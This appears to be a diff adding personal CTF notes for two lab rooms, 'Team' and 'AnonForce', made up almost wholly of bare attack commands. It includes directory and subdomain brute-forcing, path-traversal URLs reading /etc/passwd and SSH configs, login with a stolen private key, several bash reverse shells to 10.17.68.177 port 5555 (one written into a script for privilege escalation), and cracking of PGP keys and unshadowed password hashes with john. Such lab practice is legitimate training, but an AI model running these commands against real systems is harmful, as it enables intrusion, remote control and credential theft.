@@ -1,0 +1,64 @@
+Team:
+nmap -sV 10.10.10.10
+nmap -sC -sV 10.10.10.10
+
+gobuster dir -u http://team.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u http://team.thm -w /usr/share/wordlists/dirbuster/common.txt -x php,txt,html -t 30
+gobuster dir -u http://team.thm/scripts -w /usr/share/wordlists/common.txt -x txt
+
+dirsearch -u http://10.10.10.10
+
+wfuzz -c -u http://team.thm -H "Host: FUZZ.team.thm" -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt
+wfuzz -c -u http://team.thm -H "Host: FUZZ.team.thm" -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt --hw 977
+
+http://dev.team.thm/script.php?page=/../../../../etc/passwd
+http://dev.team.thm/script.php?page=/etc/ssh/ssh_config
+http://dev.team.thm/script.php?page=/etc/ssh/sshd_config
+
+chmod 600 id_rsa
+sudo ssh -i id_rsa user@ip
+
+whoami
+id
+cat user.txt
+sudo -l
+
+python -c "import pty; pty.spawn('/bin/bash')"
+python3 -c "import pty; pty.spawn('/bin/bash')"
+
+ls -la
+cd /
+ls
+cd opt
+ls
+cd admin_stuff
+ls
+cat script.sh
+
+bash -i >& /dev/tcp/10.17.68.177/5555 0>&1
+bash -c 'bash -i >& /dev/tcp/10.17.68.177/5555 0>&1'
+echo 'bash -i >& /dev/tcp/10.17.68.177/5555 0>&1' > /tmp/revshell.sh && chmod +x /tmp/revshell.sh && /tmp/revshell.sh
+
+#!/bin/bash
+bash -i >& /dev/tcp/10.17.68.177/5555 0>&1
+
+
+AnonForce:
+pwd
+ls -all
+ls -all /home
+ls -all /root
+ls -all /
+ls -all /home/www-data
+
+gpg --import private.asc
+gpg2john private.asc > pgp.hash
+locate rockyou.txt
+john pgp.hash --wordlist=/home/kali/Desktop/Wordlists/rockyou.txt
+gpg --decrypt backup.pgp
+nano shadow
+ls
+unshadow passwd shadow > shapass.txt
+cat shapass.txt
+locate rockyou.txt
+john shapass.txt --wordlist=/home/kali/Desktop/Wordlists/rockyou.txt
